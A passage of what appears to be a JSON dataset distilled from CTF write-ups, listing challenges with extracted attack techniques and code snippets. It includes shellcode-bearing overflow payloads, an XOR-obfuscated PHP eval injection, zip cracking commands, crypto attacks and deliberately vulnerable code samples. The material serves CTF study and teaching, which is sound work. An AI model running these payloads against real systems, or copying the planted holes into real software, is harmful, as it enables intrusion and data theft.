            "In challenges involving DNS queries where the request size is limited, compressing parts of the DNS query can be essential. Specifically, the DNS protocol allows for message compression in the question section by using pointers to a previous occurrence of the same name within the message. This approach can save bytes when dealing with a strict size limit. This technique is particularly useful in scenarios where the DNS query must be under a certain size to elicit a specific server response or to meet challenge requirements. Compression is achieved by replacing redundant parts of the query, such as common domain suffixes (e.g., \".com\"), with a pointer indicating where in the message that data can be found, effectively reusing bits of the message to stay within size constraints.",
            "When crafting custom DNS queries to interact with a DNS server under constraints, direct manipulation of the raw DNS message through byte manipulation can be employed. This involves constructing the DNS header, question fields, and utilizing compression techniques manually. A practical approach includes replacing part of the DNS message (such as the transaction ID or flags in the header) with a compressible domain segment (e.g., \".com\"), and then pointing to this segment from the question section. The header and question sections are built using byte manipulation, with careful calculation of each section's length and format in accordance with DNS protocol specifications. This method allows for precise control over the message's size and content, enabling the crafting of queries that meet specific conditions not achievable through conventional DNS query generation tools or libraries.\n\nExample of manipulating bytes in DNS query for compression:\n```\nheader = b'\\x03com'\ncounts = pack('!HHHH', 1,0,0,0)\nTXT=16\ntarget='free.flag.for.flag.loving.flag.capturers.downunderctf.com'\nqname = [bytes([len(l)]) + l for l in target.encode().split(b'.')[:-1]]\nqs = b''.join(qname) + pack('!H', 0b1100_0000_0000_0000) + pack('!HH', TXT, 1)\nmsg = header + counts + qs\n```"
        ],
        "key": "```python\nimport time  \nfrom dnslib.server import DNSServer, BaseResolver  \nfrom dnslib import RR, TXT, QTYPE, RCODE\n\nclass Resolver(BaseResolver):  \n   def resolve(self, dns_record, handler):  \n       \"\"\"  \n       handler.request is (data, socket)  \n       \"\"\"  \n       reply = dns_record.reply()  \n       reply.header.rcode = RCODE.reverse['REFUSED']\n\n       print(len(handler.request[0]), handler.request[0])  \n       if len(handler.request[0]) > 72:  \n           return reply\n\n       if dns_record.get_q().qtype != QTYPE.TXT:  \n           return reply\n\n       qname = dns_record.get_q().get_qname()  \n       if qname == 'free.flag.for.flag.loving.flag.capturers.downunderctf.com':  \n           FLAG = open('flag.txt', 'r').read().strip()  \n           txt_resp = FLAG  \n       else:  \n           txt_resp = 'NOPE'\n\n       reply.header.rcode = RCODE.reverse['NOERROR']  \n       reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(txt_resp)))  \n       return reply\n\nserver = DNSServer(Resolver(), port=8053)  \nserver.start_thread()  \nwhile server.isAlive():  \n   time.sleep(1)\n```"
    },
    {
        "name": "minigame",
        "write_up": "dataset/raw/minigame.md",
        "type": "reverse",
        "competition": [
            "SPbCTF/2021/Quals",
            "https://ctftime.org/event/1378/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving game logic or puzzles, the presence of hidden or coded functionalities (e.g., cheat codes) can be discovered by closely examining the game's function calls and variables interactions. Specifically, if a game's logic includes checking a variable (such as \"is_cheat_active\") that affects game outcomes (such as accessing a \"win\" function), reversing or manipulating input sequences that influence these variables can lead to unintended or advantageous states. This approach requires observing conditional checks within the game's logic that change the game's state based on specific inputs or conditions.",
            "In challenges allowing user input in specific formats (for example, BASE64), if there is a lack of proper input validation or boundary checking, it can lead to buffer overflow vulnerabilities. Exploiting such vulnerabilities can involve crafting payloads that include shellcode for command execution. This method is particularly effective in scenarios where the application processes encoded input and stores it in a buffer that is too small to contain the decoded input plus the exploit. To exploit this, one must craft a payload that, when decoded, overflows the buffer and ideally overwrites a return address or a function pointer to achieve code execution.\n   - Sample of payload: `python2 -c 'print(\"A\"*76 + \"\\xb8\\x2f\\xbin\\x2f\\x2f\\x2fsPH\\x89\\xe7hri\\x01\\x01\\x814\\x24\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05\")' | base64 -w0`"
        ],
        "key": "```c\nvoid lose_2() {\n    char buffer[512];\n    int is_cheat_active = 0;\n    // ... other code ...\n    if (is_cheat_active) {\n        win();\n    } else {\n        // ... other code ...\n        for (int i = 0; i < 6; i++) {\n            // ... some operations ...\n        }\n        // ... other code ...\n    }\n    // ... other code ...\n}\n\nvoid check_cheat() {\n    int curr_progress = 0;\n    int ch;\n    // ... other code ...\n    switch (curr_progress) {\n        case 0:\n        case 1:\n            if (ch == 0x103 || ch == 'w') {\n                curr_progress++;\n            } else {\n                curr_progress = 0;\n            }\n            break;\n        case 2:\n        case 3:\n            if (ch == 0x102 || ch == 's') {\n                curr_progress++;\n            } else {\n                curr_progress = 0;\n            }\n            break;\n        case 4:\n            if (ch == 0x104 || ch == 'a') {\n                curr_progress++;\n            } else {\n                curr_progress = 0;\n            }\n            break;\n        case 5:\n            if (ch == 0x105 || ch == 'd') {\n                curr_progress++;\n            } else {\n                curr_progress = 0;\n            }\n            break;\n        case 8:\n            if (ch == 'b') {\n                curr_progress++;\n            } else {\n                curr_progress = 0;\n            }\n            break;\n        case 9:\n            if (ch == 'a') {\n                is_cheat_active = 1;\n            }\n            curr_progress = 0;\n            break;\n        default:\n            curr_progress = 0;\n            break;\n    }\n    // ... other code ...\n}\n```"
    },
    {
        "name": "misc_CodeTiger orz Is Meta",
        "write_up": "dataset/raw/misc_CodeTiger orz Is Meta.md",
        "type": "forensics",
        "competition": [
            "LIT/2022",
            "https://ctftime.org/event/1694/tasks/"
        ],
        "score": -1.0,
        "max_score": 445,
        "difficulty": -1,
        "knowledge": [
            "When analyzing images for hidden information in CTF challenges, one of the effective methods is to inspect the XMP metadata for parts of the flag. Tools like FotoForensics or ExifTool can be utilized to extract metadata such as title, description, and rights, which might contain segments of the flag. This approach is particularly useful when direct examination of the image reveals nothing of interest.",
            "Another method to retrieve hidden information from images is by using Unix (or Unix-like) utilities like `strings`, which can extract printable strings from binary data. This can reveal the XMP metadata embedded within the image as XML content. Searching through this metadata manually or with scripts can uncover parts of the flag enclosed in standard metadata fields (title, description, rights, etc.). Additionally, text or hex editors can serve a similar purpose for extracting metadata directly from the image file.\n\nExample command using `strings`:\n```bash\nstrings example.jpg | grep -oE 'LITCTF{[^}]+}'\n```"
        ],
        "key": "```xml\n<x:xmpmeta xmlns:x='adobe:ns:meta/' x:xmptk='Image::ExifTool 12.36'>  \n<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>  \n<rdf:Description rdf:about=''  \n xmlns:dc='http://purl.org/dc/elements/1.1/'>  \n <dc:description>  \n  <rdf:Alt>  \n   <rdf:li xml:lang='x-default'>t1g2r_</rdf:li>  \n  </rdf:Alt>  \n </dc:description>  \n <dc:rights>  \n  <rdf:Alt>  \n   <rdf:li xml:lang='x-default'>orz}</rdf:li>  \n  </rdf:Alt>  \n </dc:rights>  \n <dc:title>  \n  <rdf:Alt>  \n   <rdf:li xml:lang='x-default'>LITCTF{c0de_</rdf:li>  \n  </rdf:Alt>  \n </dc:title>  \n</rdf:Description>  \n</rdf:RDF>  \n</x:xmpmeta>\n```"
    },
    {
        "name": "MIT of The South",
        "write_up": "dataset/raw/MIT of The South.md",
        "type": "web",
        "competition": [
            "TexSAW/2023",
            "https://ctftime.org/event/1959/tasks/"
        ],
        "score": 150,
        "max_score": 400,
        "difficulty": 0.375,
        "knowledge": [
            "When encountering a web challenge, checking `robots.txt` can reveal hidden directories or hints for further exploration. If the `robots.txt` file gives a clue or seems to reference a specific term or concept that seems out of place (e.g., mentioning \"tobors\" instead of \"robots\"), it's wise to explore it by altering the URL or looking for related files (in this case, checking `tobors.txt` instead of `robots.txt`). This action might lead to discovering hidden paths or directories that are not directly accessible or listed on the main page.",
            "Upon finding directories or pathways that are not immediately revealing their secrets upon manual inspection, employing a web crawler can automate the search through numerous directories. The crawler should be scripted to search for specific strings or patterns in the HTML content returned by each visited directory. This is particularly effective when you have a list of directories to check but the volume makes manual inspection impractical. For example, looking for a string that is part of the flag format (`texsaw` in this scenario) can efficiently lead to the discovery of the flag's location.\n\nA basic webcrawler example script for this scenario might use Python with the requests and BeautifulSoup libraries to recursively visit and search each directory listed in `tobors.txt` for the keyword \"texsaw\"."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context of directory traversal\n\nfrom flask import Flask, send_from_directory, request\n\napp = Flask(__name__)\n\n@app.route('/files/<path:filename>')\ndef download_file(filename):\n    # Vulnerable to directory traversal attack\n    return send_from_directory('/var/www/files', filename)\n\nif __name__ == '__main__':\n    app.run()\n```"
    },
    {
        "name": "MITM",
        "write_up": "dataset/raw/MITM.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 243,
        "max_score": 500,
        "difficulty": 0.486,
        "knowledge": [
            "In scenarios involving Diffie-Hellman key exchange protocol where the implementation allows for MitM (Man-in-the-Middle) attack but relies on the participants comparing the secrets to validate the key exchange integrity, selecting a base such as `-1` (which, in the context of modulo `p`, corresponds to `p-1`) can exploit the trust between parties. This approach relies on the mathematical property that raising `-1` to any power will result in one of two predictable outcomes, either `1` or `p-1` in modulo `p` arithmetic, simplifying the prediction of the shared secret in a MitM scenario.",
            "When facing a small enough space for Diffie-Hellman key exchange parameters (e.g., 32-bit primes), brute-forcing the discrete logarithm problem becomes feasible. This approach circumvents the need for more sophisticated attacks by directly computing private keys from public values, given the small parameter space. Tools like `sympy`'s `discrete_log` function can be effectively used to solve for the private keys, allowing the attacker to decrypt communications encrypted with the derived keys.\n\n   Sample of brute-forcing the discrete logarithm problem in Python:\n   ```python\n   from sympy.ntheory import discrete_log\n   primes = [1697841911,1438810907,666397859,941857673]\n   g = 13061880230110805485346525688018595113271880103717720219673350299083396780730251766148414377512386061643807530751287373200960399392170617293251618992497053\n   a_pub = [pub_value_from_alice]  # Sample public value from Alice\n\n   # Solve for Alice's private key as an example\n   priv_a_res = [int(discrete_log(primes[i], a_pub[i], g)) for i in range(4)]\n   ```"
        ],
        "key": "```python\nclass DHx:\n    def __init__(self, p, g):\n        self.p = p\n        self.g = g\n\n    def generate_public_key(self, private_key):\n        return pow(self.g, private_key, self.p)\n\n    def compute_shared_secret(self, received_value, private_key):\n        return pow(received_value, private_key, self.p)\n\n# Example usage\np = 23  # A small prime number for demonstration\ng = 5   # A primitive root modulo p\n\nalice_private_key = 6\nbob_private_key = 15\ncarol_private_key = 13\n\ndhx = DHx(p, g)\n\n# Alice sends g^a mod p to Bob\nalice_public = dhx.generate_public_key(alice_private_key)\n\n# Bob receives and raises by b, sends g^ab mod p to Carol\nbob_public = dhx.compute_shared_secret(alice_public, bob_private_key)\n\n# Carol receives, raises by c, keeps g^abc mod p as the secret\ncarol_secret = dhx.compute_shared_secret(bob_public, carol_private_key)\n\n# Vulnerability: Carol trusts the received value blindly\n# An attacker could send p-1 instead of a valid public key\nattacker_value = p - 1\ncarol_secret_vulnerable = dhx.compute_shared_secret(attacker_value, carol_private_key)\n```"
    },
    {
        "name": "mixed cipher",
        "write_up": "dataset/raw/mixed cipher.md",
        "type": "crypto",
        "competition": [
            "TokyoWesterns/2018",
            "https://ctftime.org/event/651/tasks/"
        ],
        "score": 233,
        "max_score": 840,
        "difficulty": 0.2773809523809524,
        "knowledge": [
            "In RSA encryption challenges, when a least significant bit (LSB) decryption oracle is available, binary search can be leveraged to reveal the plaintext in significantly fewer queries than brute force attempts. This method is effective in retrieving a decryption key or plaintext by making judicious queries based on the oracle's feedback, typically halving the search space with each query. Given a ciphertext `C`, public key `(n, e)`, and the ability to determine the LSB of the decrypted plaintext, one can adaptively query the oracle with modified ciphertexts to zero in on the plaintext. One can initiate this process by encrypting a chosen plaintext `P` with the public key to get `C`, then multiply `C` by `2^e mod n` repeatedly, querying the oracle each time to determine the LSB, and adjust the search range accordingly.",
            "The Python `random` module's predictability, based on the Mersenne Twister PRNG, can be exploited to predict future outputs if a sequence of past outputs is known. This characteristic is critical in challenges involving randomized values where the state of the random number generator can be inferred. Tools like `RandCrack` can be used to predict future values after observing 624 bytes of outputs, which is particularly useful for deducing cryptographic parameters like IVs in encryption schemes. For example, in scenarios where an AES encryption uses a `random.getrandbits(128)` generated IV, capturing 156 (`624/4`) contiguous outputs allows one to predict the next IV, enabling decryption of ciphertexts without access to the IV.\n   \nSample of Python code to predict and exploit Mersenne Twister outputs:\n```python\nfrom randcrack import RandCrack\nrc = RandCrack()\n# Assume `observed_outputs` is a list of 156 integer outputs obtained from the target application\nfor output in observed_outputs:\n    rc.submit(output)\n# Now `rc` can predict the next output\npredicted_output = rc.predict_getrandbits(128)\n```"
        ],
        "key": "```python  \nfrom Crypto.PublicKey import RSA  \nfrom Crypto.Cipher import AES  \nfrom Crypto.Util.number import long_to_bytes\n\nimport random  \nimport signal  \nimport os  \nimport sys\n\nsys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)  \nprivkey = RSA.generate(1024)  \npubkey = privkey.publickey()  \nflag = open('./flag').read().strip()  \naeskey = os.urandom(16)  \nBLOCK_SIZE = 16\n\ndef pad(s):  \n   n = 16 - len(s)%16  \n   return s + chr(n)*n\n\ndef unpad(s):  \n   n = ord(s[-1])  \n   return s[:-n]\n\ndef aes_encrypt(s):  \n   iv = long_to_bytes(random.getrandbits(BLOCK_SIZE*8), 16)  \n   aes = AES.new(aeskey, AES.MODE_CBC, iv)  \n   return iv + aes.encrypt(pad(s))\n\ndef aes_decrypt(s):  \n   iv = s[:BLOCK_SIZE]  \n   aes = AES.new(aeskey, AES.MODE_CBC, iv)  \n   return unpad(aes.decrypt(s[BLOCK_SIZE:]))\n\ndef bulldozer(s):  \n   s = bytearray(s)  \n   print('Bulldozer is coming!')  \n   for idx in range(len(s) - 1):  \n       s[idx] = '#'  \n   return str(s)\n\ndef encrypt():  \n   p = raw_input('input plain text: ').strip()  \n   print('RSA: {}'.format(pubkey.encrypt(p, 0)[0].encode('hex')))  \n   print('AES: {}'.format(aes_encrypt(p).encode('hex')))\n\ndef decrypt():  \n   c = raw_input('input hexencoded cipher text: ').strip().decode('hex')  \n   print('RSA: {}'.format(bulldozer(privkey.decrypt(c)).encode('hex')))\n\ndef print_flag():  \n   print('here is encrypted flag :)')  \n   p = flag  \n   print('another bulldozer is coming!')  \n   print(('#'*BLOCK_SIZE+aes_encrypt(p)[BLOCK_SIZE:]).encode('hex'))\n\ndef print_key():  \n   print('here is encrypted key :)')  \n   p = aeskey  \n   c = pubkey.encrypt(p, 0)[0]  \n   print(c.encode('hex'))\n\nsignal.alarm(300)  \nwhile True:  \n   print(\"\"\"Welcome to mixed cipher :)  \nI heard bulldozer is on this channel, be careful!  \n1: encrypt  \n2: decrypt  \n3: get encrypted flag  \n4: get encrypted key\"\"\")  \n   n = int(raw_input())\n\n   menu = {  \n       1: encrypt,  \n       2: decrypt,  \n       3: print_flag,  \n       4: print_key,  \n   }\n\n   if n not in menu:  \n       print('bye :)')  \n       exit()  \n   menu[n]()  \n```"
    },
    {
        "name": "Modulus Amittendus",
        "write_up": "dataset/raw/Modulus Amittendus.md",
        "type": "crypto",
        "competition": [
            "TSG/2020",
            "https://ctftime.org/event/1004/tasks/"
        ],
        "score": 365,
        "max_score": 428,
        "difficulty": 0.852803738317757,
        "knowledge": [
            "When solving challenges involving integer manipulation and encodings, specifically in scenarios where a flag is manipulated through shifts and modular arithmetic, understanding the properties of modular arithmetic can reveal the original data. In such cases, if a value is shifted (multiplied) by a power of 2, then finding the inverse modulo of a divisor that shares no common factors with the base of the shift (other than 1) can reverse the operation. For a flag encrypted by left shifting in binary (equivalent to multiplying by a power of 2) and then reduced modulo a large power of 10, using a factor of this modulus that does not share a common factor with 2 can help in retrieving the flag. Specifically, if the modulus used in encryption shares a factor with the base used in shifting (i.e., 2), an alternate factor that does not share this commonality may be used to find the modulo inverse and thus decrypt the flag.\n   \n   Example in a scenario where `flag << 10000 % 10**175` is known, using `5**175` as the modulus to find the inverse and retrieve the flag can be effective since `5**175` is a divisor of `10**175` and shares no common factors with 2.",
            "In cryptography challenges, especially when dealing with RSA encryption where direct access to the private key parameters is not available, leveraging given information about public key components incorrectly labeled or inverses of prime factors can be crucial. When primes (p, q), public exponent (e), and incorrectly labeled private exponent (d) are given, or factors such as `cf = q**-1 mod p`, identifying and exploiting relations between these values can lead to the determination of the modulus n = p*q. Techniques like iterating over possible values of k (where `e * d - 1 = k * phi(n)`) to calculate phi(n) and using given inverses to derive one of the primes (p or q) through gcd operations or relationships between the prime factors, their inverses, and phi(n), are key. \n\n   Example in the scenario where `cf = q**-1 mod p` and `d` (private exponent) is mistakenly provided instead of `n`, calculate `phi(n)` through trial with `k` values and use provided inversely related numbers (like cf) to derive primes and reconstruct n. This method involves computing `gcd(pmul values, n)` where `pmul = cf * phi(n) - cf + 1` to find p, allowing recovery of n and decryption of the ciphertext."
        ],
        "key": "```ruby\ndef pubkey  \n  privkey.to_a[..2].to_h  \nend\n\ndef privkey  \n  {  \n    e: @e,  \n    n: @d,  \n    cf: @cf,  \n    p: @p,  \n    q: @q,  \n    exp1: @exp1,  \n    exp2: @exp2,  \n  }  \nend  \n```"
    },
    {
        "name": "mod_pwn",
        "write_up": "dataset/raw/mod_pwn.md",
        "type": "pwn",
        "competition": [
            "BSidesTLV/2022",
            "https://ctftime.org/event/1680/tasks/"
        ],
        "score": -1,
        "max_score": 100,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving buffer overflows within web server modules or similar contexts, creating a buffer overflow can allow for unintended memory access. Specifically, overwriting adjacent memory locations can lead to control over variables that hold critical data, such as pointers that can be manipulated to point towards a flag stored in memory. This is executed by sending input that fills the buffer and overwrites additional memory locations with calculated values. Sample payload when targeting an HTTP server\u2019s query parameter: `GET /path?parameter=AAAA...AAAAX` where `AAAA...AAAA` is the buffer-filling payload and `X` is the calculated value to overwrite an adjacent memory location, such as a pointer to manipulate its reference.",
            "When crafting exploits for buffer overflows, guessing or calculating the exact offset needed to manipulate specific memory locations (such as pointers) can be crucial. This often involves sending payloads of varying lengths or with specific characters to identify how memory layout shifts in response to input, known as a brute force or fuzzing approach. Once the correct offset is discovered, it can be used to precisely target and manipulate memory, such as redirecting a function pointer or, as in the scenario described, changing the reference of a suffix variable to point to a flag in memory. Sample approach for finding the offset might involve incrementally increasing payload length or systematically changing the payload characters, followed by observing the system's response or output for indications of successful manipulation."
        ],
        "key": "```c\nstatic void fetch_name_param(request_rec *r, char *out) {  \n   char *name = &r->args[5]; // skipping the \"?name=\" prefix  \n   if(strlen(name) > sizeof(welcome_msg_obj)) {  \n       char *msg = apr_palloc(r->pool, MAX_NAME_SIZE); \n       sprintf(msg, \"Error, name too long: %.16s...\", name);  \n       raise_error(ERR_NAME_TOO_LONG, out, msg);   \n   } else {  \n       memcpy(out, name, strlen(name));  \n   }  \n   ap_unescape_urlencoded(out);  \n}\n```"
    },
    {
        "name": "mom can we have AES",
        "write_up": "dataset/raw/mom can we have AES.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When facing challenges involving AES encryption, especially with an ECB (Electronic CodeBook) mode due to its property where the same plaintext block produces the same ciphertext block, one can exploit this by manipulating the alignment of secret data (like a flag) relative to block boundaries. This enables a differential analysis where varying the input can reveal patterns in the encryption output, facilitating the brute-forcing of secret data. The method involves guessing one character at a time by observing the changes in encrypted output as the input aligns differently with block boundaries. This technique is particularly effective in environments where the attacker can influence the plaintext immediately preceding the secret data.",
            "In challenges involving AES encryption in CBC (Cipher Block Chaining) mode, since the decryption of each block depends only on the session key and the ciphertext of the previous block, one can manipulate the plaintext through chosen plaintext attacks to infer the contents of adjacent blocks or reveal secret data appended to controlled plaintext. The strategy involves adjusting the input plaintext in such a way that the secret data's alignment with block boundaries can be systematically tested against known blocks, allowing for incremental decryption or deduction of the secret data. Utilizing this mode requires a careful management of the IV (Initialization Vector) and ciphertext blocks to effectively apply chosen plaintext attacks for revealing secret information."
        ],
        "key": "```python  \n########## Communication ##########\n\n# Listening...  \nwhile True:  \n   client_msg = input()  \n   client_msg = unpad(cipher.decrypt(bytearray.fromhex(client_msg)),\nblock_size)\n\n   if client_msg == flag:  \n       print(\"That is correct.\")  \n   else:  \n       print(\"You are not my son.\")  \n```\n\n```python  \n########## Communication ##########\n\nwhile True:  \n   prefix = input()  \n   if len(prefix) != 0:  \n       prefix = bytearray.fromhex(prefix)  \n       extended_flag = prefix + flag  \n   else:  \n       extended_flag = flag  \n  \n   ciphertext = cipher.encrypt(pad(extended_flag, block_size)).hex()  \n   print(str(ciphertext))  \n```"
    },
    {
        "name": "mondai",
        "write_up": "dataset/raw/mondai.zip.md",
        "type": "misc",
        "competition": [
            "TokyoWesterns/2018",
            "https://ctftime.org/event/651/tasks/"
        ],
        "score": -1.0,
        "max_score": 840,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving zip files, if immediate efforts to find a password (such as using basic commands like `strings` for potential plaintext strings inside the file) are unsuccessful, leveraging a dictionary attack with a known wordlist (e.g., rockyou.txt) can be effective, particularly when no other context or file is provided to aid in the password discovery process.\nExample payload: `fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip`",
            "In scenarios where pcap files are provided, analyzing the traffic and focusing on details such as payload lengths can reveal hidden information. This approach is useful in cases where direct communication data does not offer clues, but the technical details of the packets (e.g., size, destination IP) carry encoded or indirect messages.\nExample analysis process description: Track the payload lengths of packets destined to a specific IP and use these lengths as clues for passwords or keys."
        ],
        "key": "```python\nimport zipfile\n\ndef extract_zip(zip_path, password):\n    with zipfile.ZipFile(zip_path, 'r') as z:\n        z.extractall(pwd=password.encode())\n\n# Example of a vulnerable code snippet that could be related to the challenge\n# This code does not handle exceptions or validate passwords securely\nzip_path = 'mondai.zip'\npasswords = ['y0k0s0', 'We1come', 'eVjbtTpvkU', 'happyhappyhappy', 'to']\n\nfor password in passwords:\n    try:\n        extract_zip(zip_path, password)\n        print(f\"Extracted {zip_path} with password: {password}\")\n    except RuntimeError:\n        print(f\"Failed to extract {zip_path} with password: {password}\")\n```\n"
    },
    {
        "name": "Money Money Money",
        "write_up": "dataset/raw/Money Money Money.md",
        "type": "crypto",
        "competition": [
            "vishwa/2022",
            "https://ctftime.org/event/1548/tasks/"
        ],
        "score": 499,
        "max_score": 500,
        "difficulty": 0.998,
        "knowledge": [
            "When faced with a password-protected zip archive and dictionary attacks such as using John the Ripper with the rockyou wordlist do not work, inspecting accompanying files (like images) for hidden content or steganography can reveal alternative paths or hints. Tools like `binwalk` can be used to detect embedded files within images or other containers. Example usage: `binwalk richies.jpeg`.",
            "For OSINT challenges involving blockchain transaction research, utilizing specific tools and databases related to the blockchain of interest (e.g., Etherscan for Ethereum) can yield valuable information. When the challenge hints towards specific transactions, corporate entities, or individuals, databases such as the International Consortium of Investigative Journalists\u2019 Offshore Leaks can be pivotal in uncovering necessary details. Usage of such databases involves searching with keywords extracted from hints or decoded messages within the challenge context."
        ],
        "key": "```python\ndef extract_zip(file_path, password):\n    try:\n        with zipfile.ZipFile(file_path, 'r') as zip_ref:\n            zip_ref.extractall(pwd=password.encode())\n    except RuntimeError as e:\n        print(\"Failed to extract zip file:\", e)\n\n# Example of a vulnerable function call\nextract_zip('money.zip', 'LOUIS_ESPER')\n```"
    },
    {
        "name": "morph",
        "write_up": "dataset/raw/morph.md",
        "type": "This write-up is about a reverse challenge called `m0rph` from 34C3CTF.",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 49,
        "max_score": 477,
        "difficulty": 0.10272536687631027,
        "knowledge": [
            "When debugging a binary with ASLR enabled proving to be challenging, disabling ASLR can simplify the process by making memory addresses predictable across runs. This can be achieved by executing `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` in the terminal.",
            "In reverse engineering challenges where the binary performs a series of checks on an input string (potentially a flag), one effective strategy is iteratively debugging and observing the comparison instructions (`cmp`) to deduce the correct characters of the input. This process involves setting breakpoints at critical instructions, stepping through the comparisons, and adjusting the input based on the expected vs. actual values at each step.\n   Example process:\n   - Start the process with an initial guess.\n   - Set breakpoints on comparison instructions.\n   - Run and step through the program to each breakpoint.\n   - Observe the comparisons to identify the expected character at each position.\n   - Adjust the guessed input based on these observations and repeat the process until the expected output is achieved."
        ],
        "key": "```c\nvoid shufflestruct()  \n{  \n   unsigned int v0; // eax@1  \n   int rand1; // ST10_4@2  \n   int rand2_pre; // eax@2  \n   __int64 temp; // ST18_8@2  \n   signed __int64 rand2; // rcx@2  \n   signed int i; // [sp+Ch] [bp-14h]@1\n\n   v0 = time(0LL);  \n   srand(v0);  \n   for ( i = 0; i <= 255; ++i )  \n   {  \n       rand1 = rand() % 22 + 1;  \n       rand2_pre = rand();  \n       temp = *(_QWORD *)(8LL * rand1 + struct);  \n       rand2 = 8LL * (rand2_pre % 22 + 1);  \n       *(_QWORD *)(struct + 8LL * rand1) = *(_QWORD *)(rand2 + struct);  \n       *(_QWORD *)(struct + rand2) = temp;  \n   }  \n}  \n```"
    },
    {
        "name": "Most Secure Calculator 2",
        "write_up": "dataset/raw/Most Secure Calculator 2.md",
        "type": "pwn",
        "competition": [
            "KnightCTF/2022",
            "https://ctftime.org/event/1545/tasks/"
        ],
        "score": 250,
        "max_score": 250,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with a challenge that only allows numbers and symbols but requires injection of alphabetic strings or commands, using the XOR operator can transform permissible characters into desired alphabetic characters. This method can be particularly effective in bypassing input restrictions or filters in web applications or PHP scripts where the `eval` function is used. For example, crafting specific characters using XOR to bypass restrictions and execute commands like `file_get_contents`. A general approach to crafting alphabetic strings with XOR could be `('<character 1>'^'<character 2>')` to generate a single required letter or command part.",
            "If the application uses the `eval` function to process user input, and you are constrained by a character limit or unable to use variable functions directly due to PHP `eval` limitations, crafting a payload that indirectly calls built-in PHP functions can achieve remote code execution or file reading capabilities. A strategy involves assembling a function call through concatenated strings, constructed accurately within the constraints. The concatenation method allows for dynamic assembly of the function call without running into the character limit or the direct use of restricted alphabetic characters. A specific example payload under these conditions is:  \n```  \n('@@@@\"_@@\"@@@@@@@@'^'&),%}8%4}#/.4%.43')((\"@@@_\"^\"&,!8\").(\".\").(\"@@@\"^\"484\"))  \n```  \nThis payload demonstrates how to use XOR and concatenation to create the `file_get_contents(\"flag.txt\")` call without directly writing the function name or using double quotes, effectively reading the contents of `flag.txt` within the application's constraints."
        ],
        "key": "```php\n<?php\nif (isset($_POST['equation'])) {\n    $equation = $_POST['equation'];\n    // Evaluate the equation\n    eval('$result = ' . $equation . ';');\n    echo \"Result: \" . $result;\n}\n?>\n```"
    },
    {
        "name": "Movie Marathon",
        "write_up": "dataset/raw/Movie Marathon.md",
        "type": "pwn",
        "competition": [
            "HacktivityCon/2021",
            "https://ctftime.org/event/1444/tasks/"
        ],
        "score": 444,
        "max_score": 500,
        "difficulty": 0.888,
        "knowledge": [
            "When given a CTF challenge related to gathering specific details (e.g., actors in a movie), leveraging public APIs like themoviedb.org can expedite data retrieval and solve the puzzle. First, identify the API endpoint that allows searching for a movie by its name to obtain unique identifiers such as the movie's ID. Subsequently, use the movie's ID with the appropriate endpoint to fetch detailed information, like the list of actors. \n\n   - For finding a movie's ID using its name:\n     ```python\n     import urllib.request, json\n     \n     def get_movie_id_from_movie_name(movie_name):\n         api_key = \"<your_api_key_here>\"\n         query = movie_name.replace(\" \", \"+\")\n         url = f\"https://api.themoviedb.org/3/search/movie?api_key={api_key}&query={query}\"\n         response = urllib.request.urlopen(url)\n         data = json.loads(response.read())\n         return next((item[\"id\"] for item in data[\"results\"] if item[\"title\"] == movie_name), None)\n     ```\n   \n   - For getting actor names from a movie ID:\n     ```python\n     def get_actor_from_movie_id(movie_id):\n         api_key = \"<your_api_key_here>\"\n         url = f\"https://api.themoviedb.org/3/movie/{movie_id}/credits?api_key={api_key}&language=en-US\"\n         response = urllib.request.urlopen(url)\n         data = json.loads(response.read())\n         actors = [actor[\"name\"] for actor in data[\"cast\"]]\n         return actors\n     ```",
            "In scenarios where the challenge involves interacting with an external service (e.g., a CTF challenge server), the `pwn` library can be used to automate network interactions, receive the challenge prompt, and send solutions. This library significantly simplifies the process of scripting the interaction with servers for challenges.\n\n   - Sample code snippet for interacting with a challenge server using `pwn`:\n     ```python\n     from pwn import *\n     \n     server_address = \"challenge.ctf.games\"\n     port = 31260\n     \n     # Establishing a connection to the server\n     r = remote(server_address, port)\n     \n     # Receiving a message from the server\n     challenge_prompt = r.recvline().decode()\n     \n     # Processing the challenge prompt and extracting necessary details\n     # (E.g., movie name and production year, then leveraging the above functions to solve it)\n     \n     # Sending back the solution to the server\n     r.sendline(\"<solution>\")\n     \n     # Receiving the flag\n     flag = r.recvline().decode()\n     print(flag)\n     \n     # Closing the connection\n     r.close()\n     ```"
        ],
        "key": "```python\nimport urllib.request, json\n\ndef get_actor_from_movie_id(movie_id):\n    url = \"https://api.themoviedb.org/3/movie/\" + str(movie_id) + \"/credits?api_key=1a065e36b05557397b931ef5027b85fb&language=en-US\"\n    response = urllib.request.urlopen(url)\n    data = json.loads(response.read())\n    _list = data[\"cast\"]\n    answer = []\n    for _dict in _list:\n        answer.append(_dict[\"name\"])\n    return answer\n\ndef get_movie_id_from_movie_name(ten_phim, ngay_thang, ten_phim_full):\n    url = \"https://api.themoviedb.org/3/search/movie?api_key=1a065e36b05557397b931ef5027b85fb&query=\"\n    url += ten_phim\n    response = urllib.request.urlopen(url)\n    data = json.loads(response.read())\n    _list = data[\"results\"]\n    for _dict in _list:\n        if(_dict[\"title\"] == ten_phim_full and _dict[\"release_date\"] == ngay_thang):\n            return _dict[\"id\"]\n```"
    },
    {
        "name": "Moving signals",
        "write_up": "dataset/raw/Moving signals.md",
        "type": "pwn",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
